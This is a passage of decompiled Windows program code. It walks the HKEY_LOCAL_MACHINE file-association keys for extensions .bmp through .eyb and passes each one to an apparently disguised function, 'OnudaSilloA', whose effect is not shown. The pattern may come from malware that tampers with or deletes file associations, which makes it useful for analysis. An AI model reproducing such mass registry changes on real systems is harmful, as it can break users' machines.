  loc_0044D8D8: call var_8E2C = global_00401188(var_24, "SOFTWARE\Classes\.bmp")
  loc_0044D8E4: var_8E30 = OnudaSilloA(global_80000002, var_8E2C)
  loc_0044D8E9: call var_8E34 = global_00401054
  loc_0044D8F2: call var_8E38 = global_004011CC
  loc_0044D908: call var_8E3C = global_00401188(var_24, "SOFTWARE\Classes\.bpg")
  loc_0044D914: var_8E40 = OnudaSilloA(global_80000002, var_8E3C)
  loc_0044D919: call var_8E44 = global_00401054
  loc_0044D922: call var_8E48 = global_004011CC
  loc_0044D938: call var_8E4C = global_00401188(var_24, "SOFTWARE\Classes\.bsc\PersistentHandler")
  loc_0044D944: var_8E50 = OnudaSilloA(global_80000002, var_8E4C)
  loc_0044D949: call var_8E54 = global_00401054
  loc_0044D952: call var_8E58 = global_004011CC
  loc_0044D968: call var_8E5C = global_00401188(var_24, "SOFTWARE\Classes\.bsc")
  loc_0044D974: var_8E60 = OnudaSilloA(global_80000002, var_8E5C)
  loc_0044D979: call var_8E64 = global_00401054
  loc_0044D982: call var_8E68 = global_004011CC
  loc_0044D998: call var_8E6C = global_00401188(var_24, "SOFTWARE\Classes\.bz")
  loc_0044D9A4: var_8E70 = OnudaSilloA(global_80000002, var_8E6C)
  loc_0044D9A9: call var_8E74 = global_00401054
  loc_0044D9B2: call var_8E78 = global_004011CC
  loc_0044D9C8: call var_8E7C = global_00401188(var_24, "SOFTWARE\Classes\.bz2")
  loc_0044D9D4: var_8E80 = OnudaSilloA(global_80000002, var_8E7C)
  loc_0044D9D9: call var_8E84 = global_00401054
  loc_0044D9E2: call var_8E88 = global_004011CC
  loc_0044D9F8: call var_8E8C = global_00401188(var_24, "SOFTWARE\Classes\.c\PersistentHandler")
  loc_0044DA04: var_8E90 = OnudaSilloA(global_80000002, var_8E8C)
  loc_0044DA09: call var_8E94 = global_00401054
  loc_0044DA12: call var_8E98 = global_004011CC
  loc_0044DA28: call var_8E9C = global_00401188(var_24, "SOFTWARE\Classes\.c")
  loc_0044DA34: var_8EA0 = OnudaSilloA(global_80000002, var_8E9C)
  loc_0044DA39: call var_8EA4 = global_00401054
  loc_0044DA42: call var_8EA8 = global_004011CC
  loc_0044DA58: call var_8EAC = global_00401188(var_24, "SOFTWARE\Classes\.cab\PersistentHandler")
  loc_0044DA64: var_8EB0 = OnudaSilloA(global_80000002, var_8EAC)
  loc_0044DA69: call var_8EB4 = global_00401054
  loc_0044DA72: call var_8EB8 = global_004011CC
  loc_0044DA88: call var_8EBC = global_00401188(var_24, "SOFTWARE\Classes\.cab")
  loc_0044DA94: var_8EC0 = OnudaSilloA(global_80000002, var_8EBC)
  loc_0044DA99: call var_8EC4 = global_00401054
  loc_0044DAA2: call var_8EC8 = global_004011CC
  loc_0044DAB8: call var_8ECC = global_00401188(var_24, "SOFTWARE\Classes\.cat")
  loc_0044DAC4: var_8ED0 = OnudaSilloA(global_80000002, var_8ECC)
  loc_0044DAC9: call var_8ED4 = global_00401054
  loc_0044DAD2: call var_8ED8 = global_004011CC
  loc_0044DAE8: call var_8EDC = global_00401188(var_24, "SOFTWARE\Classes\.cda\OpenWithList\wmplayer.exe")
  loc_0044DAF4: var_8EE0 = OnudaSilloA(global_80000002, var_8EDC)
  loc_0044DAF9: call var_8EE4 = global_00401054
  loc_0044DB02: call var_8EE8 = global_004011CC
  loc_0044DB18: call var_8EEC = global_00401188(var_24, "SOFTWARE\Classes\.cda\OpenWithList")
  loc_0044DB24: var_8EF0 = OnudaSilloA(global_80000002, var_8EEC)
  loc_0044DB29: call var_8EF4 = global_00401054
  loc_0044DB32: call var_8EF8 = global_004011CC
  loc_0044DB48: call var_8EFC = global_00401188(var_24, "SOFTWARE\Classes\.cda\OpenWithProgIds")
  loc_0044DB54: var_8F00 = OnudaSilloA(global_80000002, var_8EFC)
  loc_0044DB59: call var_8F04 = global_00401054
  loc_0044DB62: call var_8F08 = global_004011CC
  loc_0044DB78: call var_8F0C = global_00401188(var_24, "SOFTWARE\Classes\.cda\PersistentHandler")
  loc_0044DB84: var_8F10 = OnudaSilloA(global_80000002, var_8F0C)
  loc_0044DB89: call var_8F14 = global_00401054
  loc_0044DB92: call var_8F18 = global_004011CC
  loc_0044DBA8: call var_8F1C = global_00401188(var_24, "SOFTWARE\Classes\.cda")
  loc_0044DBB4: var_8F20 = OnudaSilloA(global_80000002, var_8F1C)
  loc_0044DBB9: call var_8F24 = global_00401054
  loc_0044DBC2: call var_8F28 = global_004011CC
  loc_0044DBD8: call var_8F2C = global_00401188(var_24, "SOFTWARE\Classes\.cdf")
  loc_0044DBE4: var_8F30 = OnudaSilloA(global_80000002, var_8F2C)
  loc_0044DBE9: call var_8F34 = global_00401054
  loc_0044DBF2: call var_8F38 = global_004011CC
  loc_0044DC08: call var_8F3C = global_00401188(var_24, "SOFTWARE\Classes\.cdx")
  loc_0044DC14: var_8F40 = OnudaSilloA(global_80000002, var_8F3C)
  loc_0044DC19: call var_8F44 = global_00401054
  loc_0044DC22: call var_8F48 = global_004011CC
  loc_0044DC38: call var_8F4C = global_00401188(var_24, "SOFTWARE\Classes\.cer")
  loc_0044DC44: var_8F50 = OnudaSilloA(global_80000002, var_8F4C)
  loc_0044DC49: call var_8F54 = global_00401054
  loc_0044DC52: call var_8F58 = global_004011CC
  loc_0044DC68: call var_8F5C = global_00401188(var_24, "SOFTWARE\Classes\.cgm\PersistentHandler")
  loc_0044DC74: var_8F60 = OnudaSilloA(global_80000002, var_8F5C)
  loc_0044DC79: call var_8F64 = global_00401054
  loc_0044DC82: call var_8F68 = global_004011CC
  loc_0044DC98: call var_8F6C = global_00401188(var_24, "SOFTWARE\Classes\.cgm")
  loc_0044DCA4: var_8F70 = OnudaSilloA(global_80000002, var_8F6C)
  loc_0044DCA9: call var_8F74 = global_00401054
  loc_0044DCB2: call var_8F78 = global_004011CC
  loc_0044DCC8: call var_8F7C = global_00401188(var_24, "SOFTWARE\Classes\.chk")
  loc_0044DCD4: var_8F80 = OnudaSilloA(global_80000002, var_8F7C)
  loc_0044DCD9: call var_8F84 = global_00401054
  loc_0044DCE2: call var_8F88 = global_004011CC
  loc_0044DCF8: call var_8F8C = global_00401188(var_24, "SOFTWARE\Classes\.chm")
  loc_0044DD04: var_8F90 = OnudaSilloA(global_80000002, var_8F8C)
  loc_0044DD09: call var_8F94 = global_00401054
  loc_0044DD12: call var_8F98 = global_004011CC
  loc_0044DD28: call var_8F9C = global_00401188(var_24, "SOFTWARE\Classes\.cin")
  loc_0044DD34: var_8FA0 = OnudaSilloA(global_80000002, var_8F9C)
  loc_0044DD39: call var_8FA4 = global_00401054
  loc_0044DD42: call var_8FA8 = global_004011CC
  loc_0044DD58: call var_8FAC = global_00401188(var_24, "SOFTWARE\Classes\.clp")
  loc_0044DD64: var_8FB0 = OnudaSilloA(global_80000002, var_8FAC)
  loc_0044DD69: call var_8FB4 = global_00401054
  loc_0044DD72: call var_8FB8 = global_004011CC
  loc_0044DD88: call var_8FBC = global_00401188(var_24, "SOFTWARE\Classes\.cls")
  loc_0044DD94: var_8FC0 = OnudaSilloA(global_80000002, var_8FBC)
  loc_0044DD99: call var_8FC4 = global_00401054
  loc_0044DDA2: call var_8FC8 = global_004011CC
  loc_0044DDB8: call var_8FCC = global_00401188(var_24, "SOFTWARE\Classes\.cmd\PersistentHandler")
  loc_0044DDC4: var_8FD0 = OnudaSilloA(global_80000002, var_8FCC)
  loc_0044DDC9: call var_8FD4 = global_00401054
  loc_0044DDD2: call var_8FD8 = global_004011CC
  loc_0044DDE8: call var_8FDC = global_00401188(var_24, "SOFTWARE\Classes\.cmd")
  loc_0044DDF4: var_8FE0 = OnudaSilloA(global_80000002, var_8FDC)
  loc_0044DDF9: call var_8FE4 = global_00401054
  loc_0044DE02: call var_8FE8 = global_004011CC
  loc_0044DE18: call var_8FEC = global_00401188(var_24, "SOFTWARE\Classes\.cnf")
  loc_0044DE24: var_8FF0 = OnudaSilloA(global_80000002, var_8FEC)
  loc_0044DE29: call var_8FF4 = global_00401054
  loc_0044DE32: call var_8FF8 = global_004011CC
  loc_0044DE48: call var_8FFC = global_00401188(var_24, "SOFTWARE\Classes\.com\PersistentHandler")
  loc_0044DE54: var_9000 = OnudaSilloA(global_80000002, var_8FFC)
  loc_0044DE59: call var_9004 = global_00401054
  loc_0044DE62: call var_9008 = global_004011CC
  loc_0044DE78: call var_900C = global_00401188(var_24, "SOFTWARE\Classes\.com")
  loc_0044DE84: var_9010 = OnudaSilloA(global_80000002, var_900C)
  loc_0044DE89: call var_9014 = global_00401054
  loc_0044DE92: call var_9018 = global_004011CC
  loc_0044DEA8: call var_901C = global_00401188(var_24, "SOFTWARE\Classes\.cpl\PersistentHandler")
  loc_0044DEB4: var_9020 = OnudaSilloA(global_80000002, var_901C)
  loc_0044DEB9: call var_9024 = global_00401054
  loc_0044DEC2: call var_9028 = global_004011CC
  loc_0044DED8: call var_902C = global_00401188(var_24, "SOFTWARE\Classes\.cpl")
  loc_0044DEE4: var_9030 = OnudaSilloA(global_80000002, var_902C)
  loc_0044DEE9: call var_9034 = global_00401054
  loc_0044DEF2: call var_9038 = global_004011CC
  loc_0044DF08: call var_903C = global_00401188(var_24, "SOFTWARE\Classes\.cpp\PersistentHandler")
  loc_0044DF14: var_9040 = OnudaSilloA(global_80000002, var_903C)
  loc_0044DF19: call var_9044 = global_00401054
  loc_0044DF22: call var_9048 = global_004011CC
  loc_0044DF38: call var_904C = global_00401188(var_24, "SOFTWARE\Classes\.cpp")
  loc_0044DF44: var_9050 = OnudaSilloA(global_80000002, var_904C)
  loc_0044DF49: call var_9054 = global_00401054
  loc_0044DF52: call var_9058 = global_004011CC
  loc_0044DF68: call var_905C = global_00401188(var_24, "SOFTWARE\Classes\.crl")
  loc_0044DF74: var_9060 = OnudaSilloA(global_80000002, var_905C)
  loc_0044DF79: call var_9064 = global_00401054
  loc_0044DF82: call var_9068 = global_004011CC
  loc_0044DF98: call var_906C = global_00401188(var_24, "SOFTWARE\Classes\.crt")
  loc_0044DFA4: var_9070 = OnudaSilloA(global_80000002, var_906C)
  loc_0044DFA9: call var_9074 = global_00401054
  loc_0044DFB2: call var_9078 = global_004011CC
  loc_0044DFC8: call var_907C = global_00401188(var_24, "SOFTWARE\Classes\.css\PersistentHandler")
  loc_0044DFD4: var_9080 = OnudaSilloA(global_80000002, var_907C)
  loc_0044DFD9: call var_9084 = global_00401054
  loc_0044DFE2: call var_9088 = global_004011CC
  loc_0044DFF8: call var_908C = global_00401188(var_24, "SOFTWARE\Classes\.css")
  loc_0044E004: var_9090 = OnudaSilloA(global_80000002, var_908C)
  loc_0044E009: call var_9094 = global_00401054
  loc_0044E012: call var_9098 = global_004011CC
  loc_0044E028: call var_909C = global_00401188(var_24, "SOFTWARE\Classes\.csv")
  loc_0044E034: var_90A0 = OnudaSilloA(global_80000002, var_909C)
  loc_0044E039: call var_90A4 = global_00401054
  loc_0044E042: call var_90A8 = global_004011CC
  loc_0044E058: call var_90AC = global_00401188(var_24, "SOFTWARE\Classes\.CTT")
  loc_0044E064: var_90B0 = OnudaSilloA(global_80000002, var_90AC)
  loc_0044E069: call var_90B4 = global_00401054
  loc_0044E072: call var_90B8 = global_004011CC
  loc_0044E088: call var_90BC = global_00401188(var_24, "SOFTWARE\Classes\.ctx")
  loc_0044E094: var_90C0 = OnudaSilloA(global_80000002, var_90BC)
  loc_0044E099: call var_90C4 = global_00401054
  loc_0044E0A2: call var_90C8 = global_004011CC
  loc_0044E0B8: call var_90CC = global_00401188(var_24, "SOFTWARE\Classes\.cur\PersistentHandler")
  loc_0044E0C4: var_90D0 = OnudaSilloA(global_80000002, var_90CC)
  loc_0044E0C9: call var_90D4 = global_00401054
  loc_0044E0D2: call var_90D8 = global_004011CC
  loc_0044E0E8: call var_90DC = global_00401188(var_24, "SOFTWARE\Classes\.cur")
  loc_0044E0F4: var_90E0 = OnudaSilloA(global_80000002, var_90DC)
  loc_0044E0F9: call var_90E4 = global_00401054
  loc_0044E102: call var_90E8 = global_004011CC
  loc_0044E118: call var_90EC = global_00401188(var_24, "SOFTWARE\Classes\.cxx\PersistentHandler")
  loc_0044E124: var_90F0 = OnudaSilloA(global_80000002, var_90EC)
  loc_0044E129: call var_90F4 = global_00401054
  loc_0044E132: call var_90F8 = global_004011CC
  loc_0044E148: call var_90FC = global_00401188(var_24, "SOFTWARE\Classes\.cxx")
  loc_0044E154: var_9100 = OnudaSilloA(global_80000002, var_90FC)
  loc_0044E159: call var_9104 = global_00401054
  loc_0044E162: call var_9108 = global_004011CC
  loc_0044E178: call var_910C = global_00401188(var_24, "SOFTWARE\Classes\.dat")
  loc_0044E184: var_9110 = OnudaSilloA(global_80000002, var_910C)
  loc_0044E189: call var_9114 = global_00401054
  loc_0044E192: call var_9118 = global_004011CC
  loc_0044E1A8: call var_911C = global_00401188(var_24, "SOFTWARE\Classes\.db")
  loc_0044E1B4: var_9120 = OnudaSilloA(global_80000002, var_911C)
  loc_0044E1B9: call var_9124 = global_00401054
  loc_0044E1C2: call var_9128 = global_004011CC
  loc_0044E1D8: call var_912C = global_00401188(var_24, "SOFTWARE\Classes\.dbg\PersistentHandler")
  loc_0044E1E4: var_9130 = OnudaSilloA(global_80000002, var_912C)
  loc_0044E1E9: call var_9134 = global_00401054
  loc_0044E1F2: call var_9138 = global_004011CC
  loc_0044E208: call var_913C = global_00401188(var_24, "SOFTWARE\Classes\.dbg")
  loc_0044E214: var_9140 = OnudaSilloA(global_80000002, var_913C)
  loc_0044E219: call var_9144 = global_00401054
  loc_0044E222: call var_9148 = global_004011CC
  loc_0044E238: call var_914C = global_00401188(var_24, "SOFTWARE\Classes\.dct\PersistentHandler")
  loc_0044E244: var_9150 = OnudaSilloA(global_80000002, var_914C)
  loc_0044E249: call var_9154 = global_00401054
  loc_0044E252: call var_9158 = global_004011CC
  loc_0044E268: call var_915C = global_00401188(var_24, "SOFTWARE\Classes\.dct")
  loc_0044E274: var_9160 = OnudaSilloA(global_80000002, var_915C)
  loc_0044E279: call var_9164 = global_00401054
  loc_0044E282: call var_9168 = global_004011CC
  loc_0044E298: call var_916C = global_00401188(var_24, "SOFTWARE\Classes\.def\PersistentHandler")
  loc_0044E2A4: var_9170 = OnudaSilloA(global_80000002, var_916C)
  loc_0044E2A9: call var_9174 = global_00401054
  loc_0044E2B2: call var_9178 = global_004011CC
  loc_0044E2C8: call var_917C = global_00401188(var_24, "SOFTWARE\Classes\.def")
  loc_0044E2D4: var_9180 = OnudaSilloA(global_80000002, var_917C)
  loc_0044E2D9: call var_9184 = global_00401054
  loc_0044E2E2: call var_9188 = global_004011CC
  loc_0044E2F8: call var_918C = global_00401188(var_24, "SOFTWARE\Classes\.der")
  loc_0044E304: var_9190 = OnudaSilloA(global_80000002, var_918C)
  loc_0044E309: call var_9194 = global_00401054
  loc_0044E312: call var_9198 = global_004011CC
  loc_0044E328: call var_919C = global_00401188(var_24, "SOFTWARE\Classes\.DeskLink\PersistentHandler")
  loc_0044E334: var_91A0 = OnudaSilloA(global_80000002, var_919C)
  loc_0044E339: call var_91A4 = global_00401054
  loc_0044E342: call var_91A8 = global_004011CC
  loc_0044E358: call var_91AC = global_00401188(var_24, "SOFTWARE\Classes\.DeskLink")
  loc_0044E364: var_91B0 = OnudaSilloA(global_80000002, var_91AC)
  loc_0044E369: call var_91B4 = global_00401054
  loc_0044E372: call var_91B8 = global_004011CC
  loc_0044E388: call var_91BC = global_00401188(var_24, "SOFTWARE\Classes\.dfm")
  loc_0044E394: var_91C0 = OnudaSilloA(global_80000002, var_91BC)
  loc_0044E399: call var_91C4 = global_00401054
  loc_0044E3A2: call var_91C8 = global_004011CC
  loc_0044E3B8: call var_91CC = global_00401188(var_24, "SOFTWARE\Classes\.dib\OpenWithProgids")
  loc_0044E3C4: var_91D0 = OnudaSilloA(global_80000002, var_91CC)
  loc_0044E3C9: call var_91D4 = global_00401054
  loc_0044E3D2: call var_91D8 = global_004011CC
  loc_0044E3E8: call var_91DC = global_00401188(var_24, "SOFTWARE\Classes\.dib\PersistentHandler")
  loc_0044E3F4: var_91E0 = OnudaSilloA(global_80000002, var_91DC)
  loc_0044E3F9: call var_91E4 = global_00401054
  loc_0044E402: call var_91E8 = global_004011CC
  loc_0044E418: call var_91EC = global_00401188(var_24, "SOFTWARE\Classes\.dib")
  loc_0044E424: var_91F0 = OnudaSilloA(global_80000002, var_91EC)
  loc_0044E429: call var_91F4 = global_00401054
  loc_0044E432: call var_91F8 = global_004011CC
  loc_0044E448: call var_91FC = global_00401188(var_24, "SOFTWARE\Classes\.dic\PersistentHandler")
  loc_0044E454: var_9200 = OnudaSilloA(global_80000002, var_91FC)
  loc_0044E459: call var_9204 = global_00401054
  loc_0044E462: call var_9208 = global_004011CC
  loc_0044E478: call var_920C = global_00401188(var_24, "SOFTWARE\Classes\.dic")
  loc_0044E484: var_9210 = OnudaSilloA(global_80000002, var_920C)
  loc_0044E489: call var_9214 = global_00401054
  loc_0044E492: call var_9218 = global_004011CC
  loc_0044E4A8: call var_921C = global_00401188(var_24, "SOFTWARE\Classes\.diz")
  loc_0044E4B4: var_9220 = OnudaSilloA(global_80000002, var_921C)
  loc_0044E4B9: call var_9224 = global_00401054
  loc_0044E4C2: call var_9228 = global_004011CC
  loc_0044E4D8: call var_922C = global_00401188(var_24, "SOFTWARE\Classes\.dl_\PersistentHandler")
  loc_0044E4E4: var_9230 = OnudaSilloA(global_80000002, var_922C)
  loc_0044E4E9: call var_9234 = global_00401054
  loc_0044E4F2: call var_9238 = global_004011CC
  loc_0044E508: call var_923C = global_00401188(var_24, "SOFTWARE\Classes\.dl_")
  loc_0044E514: var_9240 = OnudaSilloA(global_80000002, var_923C)
  loc_0044E519: call var_9244 = global_00401054
  loc_0044E522: call var_9248 = global_004011CC
  loc_0044E538: call var_924C = global_00401188(var_24, "SOFTWARE\Classes\.dll\PersistentHandler")
  loc_0044E544: var_9250 = OnudaSilloA(global_80000002, var_924C)
  loc_0044E549: call var_9254 = global_00401054
  loc_0044E552: call var_9258 = global_004011CC
  loc_0044E568: call var_925C = global_00401188(var_24, "SOFTWARE\Classes\.dll")
  loc_0044E574: var_9260 = OnudaSilloA(global_80000002, var_925C)
  loc_0044E579: call var_9264 = global_00401054
  loc_0044E582: call var_9268 = global_004011CC
  loc_0044E598: call var_926C = global_00401188(var_24, "SOFTWARE\Classes\.dob")
  loc_0044E5A4: var_9270 = OnudaSilloA(global_80000002, var_926C)
  loc_0044E5A9: call var_9274 = global_00401054
  loc_0044E5B2: call var_9278 = global_004011CC
  loc_0044E5C8: call var_927C = global_00401188(var_24, "SOFTWARE\Classes\.doc\OpenWithList\WordPad.exe")
  loc_0044E5D4: var_9280 = OnudaSilloA(global_80000002, var_927C)
  loc_0044E5D9: call var_9284 = global_00401054
  loc_0044E5E2: call var_9288 = global_004011CC
  loc_0044E5F8: call var_928C = global_00401188(var_24, "SOFTWARE\Classes\.doc\OpenWithList")
  loc_0044E604: var_9290 = OnudaSilloA(global_80000002, var_928C)
  loc_0044E609: call var_9294 = global_00401054
  loc_0044E612: call var_9298 = global_004011CC
  loc_0044E628: call var_929C = global_00401188(var_24, "SOFTWARE\Classes\.doc\PersistentHandler")
  loc_0044E634: var_92A0 = OnudaSilloA(global_80000002, var_929C)
  loc_0044E639: call var_92A4 = global_00401054
  loc_0044E642: call var_92A8 = global_004011CC
  loc_0044E658: call var_92AC = global_00401188(var_24, "SOFTWARE\Classes\.doc\ShellNew")
  loc_0044E664: var_92B0 = OnudaSilloA(global_80000002, var_92AC)
  loc_0044E669: call var_92B4 = global_00401054
  loc_0044E672: call var_92B8 = global_004011CC
  loc_0044E688: call var_92BC = global_00401188(var_24, "SOFTWARE\Classes\.doc\Word.Document.6\ShellNew")
  loc_0044E694: var_92C0 = OnudaSilloA(global_80000002, var_92BC)
  loc_0044E699: call var_92C4 = global_00401054
  loc_0044E6A2: call var_92C8 = global_004011CC
  loc_0044E6B8: call var_92CC = global_00401188(var_24, "SOFTWARE\Classes\.doc\Word.Document.6")
  loc_0044E6C4: var_92D0 = OnudaSilloA(global_80000002, var_92CC)
  loc_0044E6C9: call var_92D4 = global_00401054
  loc_0044E6D2: call var_92D8 = global_004011CC
  loc_0044E6E8: call var_92DC = global_00401188(var_24, "SOFTWARE\Classes\.doc\WordDocument\ShellNew")
  loc_0044E6F4: var_92E0 = OnudaSilloA(global_80000002, var_92DC)
  loc_0044E6F9: call var_92E4 = global_00401054
  loc_0044E702: call var_92E8 = global_004011CC
  loc_0044E718: call var_92EC = global_00401188(var_24, "SOFTWARE\Classes\.doc\WordDocument")
  loc_0044E724: var_92F0 = OnudaSilloA(global_80000002, var_92EC)
  loc_0044E729: call var_92F4 = global_00401054
  loc_0044E732: call var_92F8 = global_004011CC
  loc_0044E748: call var_92FC = global_00401188(var_24, "SOFTWARE\Classes\.doc\WordPad.Document.1\ShellNew")
  loc_0044E754: var_9300 = OnudaSilloA(global_80000002, var_92FC)
  loc_0044E759: call var_9304 = global_00401054
  loc_0044E762: call var_9308 = global_004011CC
  loc_0044E778: call var_930C = global_00401188(var_24, "SOFTWARE\Classes\.doc\WordPad.Document.1")
  loc_0044E784: var_9310 = OnudaSilloA(global_80000002, var_930C)
  loc_0044E789: call var_9314 = global_00401054
  loc_0044E792: call var_9318 = global_004011CC
  loc_0044E7A8: call var_931C = global_00401188(var_24, "SOFTWARE\Classes\.doc")
  loc_0044E7B4: var_9320 = OnudaSilloA(global_80000002, var_931C)
  loc_0044E7B9: call var_9324 = global_00401054
  loc_0044E7C2: call var_9328 = global_004011CC
  loc_0044E7D8: call var_932C = global_00401188(var_24, "SOFTWARE\Classes\.dos")
  loc_0044E7E4: var_9330 = OnudaSilloA(global_80000002, var_932C)
  loc_0044E7E9: call var_9334 = global_00401054
  loc_0044E7F2: call var_9338 = global_004011CC
  loc_0044E808: call var_933C = global_00401188(var_24, "SOFTWARE\Classes\.dot\PersistentHandler")
  loc_0044E814: var_9340 = OnudaSilloA(global_80000002, var_933C)
  loc_0044E819: call var_9344 = global_00401054
  loc_0044E822: call var_9348 = global_004011CC
  loc_0044E838: call var_934C = global_00401188(var_24, "SOFTWARE\Classes\.dot")
  loc_0044E844: var_9350 = OnudaSilloA(global_80000002, var_934C)
  loc_0044E849: call var_9354 = global_00401054
  loc_0044E852: call var_9358 = global_004011CC
  loc_0044E868: call var_935C = global_00401188(var_24, "SOFTWARE\Classes\.dox")
  loc_0044E874: var_9360 = OnudaSilloA(global_80000002, var_935C)
  loc_0044E879: call var_9364 = global_00401054
  loc_0044E882: call var_9368 = global_004011CC
  loc_0044E898: call var_936C = global_00401188(var_24, "SOFTWARE\Classes\.dpk")
  loc_0044E8A4: var_9370 = OnudaSilloA(global_80000002, var_936C)
  loc_0044E8A9: call var_9374 = global_00401054
  loc_0044E8B2: call var_9378 = global_004011CC
  loc_0044E8C8: call var_937C = global_00401188(var_24, "SOFTWARE\Classes\.dpr")
  loc_0044E8D4: var_9380 = OnudaSilloA(global_80000002, var_937C)
  loc_0044E8D9: call var_9384 = global_00401054
  loc_0044E8E2: call var_9388 = global_004011CC
  loc_0044E8F8: call var_938C = global_00401188(var_24, "SOFTWARE\Classes\.drv\PersistentHandler")
  loc_0044E904: var_9390 = OnudaSilloA(global_80000002, var_938C)
  loc_0044E909: call var_9394 = global_00401054
  loc_0044E912: call var_9398 = global_004011CC
  loc_0044E928: call var_939C = global_00401188(var_24, "SOFTWARE\Classes\.drv")
  loc_0044E934: var_93A0 = OnudaSilloA(global_80000002, var_939C)
  loc_0044E939: call var_93A4 = global_00401054
  loc_0044E942: call var_93A8 = global_004011CC
  loc_0044E958: call var_93AC = global_00401188(var_24, "SOFTWARE\Classes\.dsm")
  loc_0044E964: var_93B0 = OnudaSilloA(global_80000002, var_93AC)
  loc_0044E969: call var_93B4 = global_00401054
  loc_0044E972: call var_93B8 = global_004011CC
  loc_0044E988: call var_93BC = global_00401188(var_24, "SOFTWARE\Classes\.dsn")
  loc_0044E994: var_93C0 = OnudaSilloA(global_80000002, var_93BC)
  loc_0044E999: call var_93C4 = global_00401054
  loc_0044E9A2: call var_93C8 = global_004011CC
  loc_0044E9B8: call var_93CC = global_00401188(var_24, "SOFTWARE\Classes\.dsr")
  loc_0044E9C4: var_93D0 = OnudaSilloA(global_80000002, var_93CC)
  loc_0044E9C9: call var_93D4 = global_00401054
  loc_0044E9D2: call var_93D8 = global_004011CC
  loc_0044E9E8: call var_93DC = global_00401188(var_24, "SOFTWARE\Classes\.dsx")
  loc_0044E9F4: var_93E0 = OnudaSilloA(global_80000002, var_93DC)
  loc_0044E9F9: call var_93E4 = global_00401054
  loc_0044EA02: call var_93E8 = global_004011CC
  loc_0044EA18: call var_93EC = global_00401188(var_24, "SOFTWARE\Classes\.dun")
  loc_0044EA24: var_93F0 = OnudaSilloA(global_80000002, var_93EC)
  loc_0044EA29: call var_93F4 = global_00401054
  loc_0044EA32: call var_93F8 = global_004011CC
  loc_0044EA48: call var_93FC = global_00401188(var_24, "SOFTWARE\Classes\.dv")
  loc_0044EA54: var_9400 = OnudaSilloA(global_80000002, var_93FC)
  loc_0044EA59: call var_9404 = global_00401054
  loc_0044EA62: call var_9408 = global_004011CC
  loc_0044EA78: call var_940C = global_00401188(var_24, "SOFTWARE\Classes\.dvd\PersistentHandler")
  loc_0044EA84: var_9410 = OnudaSilloA(global_80000002, var_940C)
  loc_0044EA89: call var_9414 = global_00401054
  loc_0044EA92: call var_9418 = global_004011CC
  loc_0044EAA8: call var_941C = global_00401188(var_24, "SOFTWARE\Classes\.dvd")
  loc_0044EAB4: var_9420 = OnudaSilloA(global_80000002, var_941C)
  loc_0044EAB9: call var_9424 = global_00401054
  loc_0044EAC2: call var_9428 = global_004011CC
  loc_0044EAD8: call var_942C = global_00401188(var_24, "SOFTWARE\Classes\.dvr-ms\OpenWithList\wmplayer.exe")
  loc_0044EAE4: var_9430 = OnudaSilloA(global_80000002, var_942C)
  loc_0044EAE9: call var_9434 = global_00401054
  loc_0044EAF2: call var_9438 = global_004011CC
  loc_0044EB08: call var_943C = global_00401188(var_24, "SOFTWARE\Classes\.dvr-ms\OpenWithList")
  loc_0044EB14: var_9440 = OnudaSilloA(global_80000002, var_943C)
  loc_0044EB19: call var_9444 = global_00401054
  loc_0044EB22: call var_9448 = global_004011CC
  loc_0044EB38: call var_944C = global_00401188(var_24, "SOFTWARE\Classes\.dvr-ms\OpenWithProgIds")
  loc_0044EB44: var_9450 = OnudaSilloA(global_80000002, var_944C)
  loc_0044EB49: call var_9454 = global_00401054
  loc_0044EB52: call var_9458 = global_004011CC
  loc_0044EB68: call var_945C = global_00401188(var_24, "SOFTWARE\Classes\.dvr-ms")
  loc_0044EB74: var_9460 = OnudaSilloA(global_80000002, var_945C)
  loc_0044EB79: call var_9464 = global_00401054
  loc_0044EB82: call var_9468 = global_004011CC
  loc_0044EB98: call var_946C = global_00401188(var_24, "SOFTWARE\Classes\.emf\OpenWithProgids")
  loc_0044EBA4: var_9470 = OnudaSilloA(global_80000002, var_946C)
  loc_0044EBA9: call var_9474 = global_00401054
  loc_0044EBB2: call var_9478 = global_004011CC
  loc_0044EBC8: call var_947C = global_00401188(var_24, "SOFTWARE\Classes\.emf\PersistentHandler")
  loc_0044EBD4: var_9480 = OnudaSilloA(global_80000002, var_947C)
  loc_0044EBD9: call var_9484 = global_00401054
  loc_0044EBE2: call var_9488 = global_004011CC
  loc_0044EBF8: call var_948C = global_00401188(var_24, "SOFTWARE\Classes\.emf")
  loc_0044EC04: var_9490 = OnudaSilloA(global_80000002, var_948C)
  loc_0044EC09: call var_9494 = global_00401054
  loc_0044EC12: call var_9498 = global_004011CC
  loc_0044EC28: call var_949C = global_00401188(var_24, "SOFTWARE\Classes\.eml")
  loc_0044EC34: var_94A0 = OnudaSilloA(global_80000002, var_949C)
  loc_0044EC39: call var_94A4 = global_00401054
  loc_0044EC42: call var_94A8 = global_004011CC
  loc_0044EC58: call var_94AC = global_00401188(var_24, "SOFTWARE\Classes\.eps\PersistentHandler")
  loc_0044EC64: var_94B0 = OnudaSilloA(global_80000002, var_94AC)
  loc_0044EC69: call var_94B4 = global_00401054
  loc_0044EC72: call var_94B8 = global_004011CC
  loc_0044EC88: call var_94BC = global_00401188(var_24, "SOFTWARE\Classes\.eps")
  loc_0044EC94: var_94C0 = OnudaSilloA(global_80000002, var_94BC)
  loc_0044EC99: call var_94C4 = global_00401054
  loc_0044ECA2: call var_94C8 = global_004011CC
  loc_0044ECB8: call var_94CC = global_00401188(var_24, "SOFTWARE\Classes\.ex_\PersistentHandler")
  loc_0044ECC4: var_94D0 = OnudaSilloA(global_80000002, var_94CC)
  loc_0044ECC9: call var_94D4 = global_00401054
  loc_0044ECD2: call var_94D8 = global_004011CC
  loc_0044ECE8: call var_94DC = global_00401188(var_24, "SOFTWARE\Classes\.ex_")
  loc_0044ECF4: var_94E0 = OnudaSilloA(global_80000002, var_94DC)
  loc_0044ECF9: call var_94E4 = global_00401054
  loc_0044ED02: call var_94E8 = global_004011CC
  loc_0044ED18: call var_94EC = global_00401188(var_24, "SOFTWARE\Classes\.exp\PersistentHandler")
  loc_0044ED24: var_94F0 = OnudaSilloA(global_80000002, var_94EC)
  loc_0044ED29: call var_94F4 = global_00401054
  loc_0044ED32: call var_94F8 = global_004011CC
  loc_0044ED48: call var_94FC = global_00401188(var_24, "SOFTWARE\Classes\.exp")
  loc_0044ED54: var_9500 = OnudaSilloA(global_80000002, var_94FC)
  loc_0044ED59: call var_9504 = global_00401054
  loc_0044ED62: call var_9508 = global_004011CC
  loc_0044ED78: call var_950C = global_00401188(var_24, "SOFTWARE\Classes\.eyb\PersistentHandler")
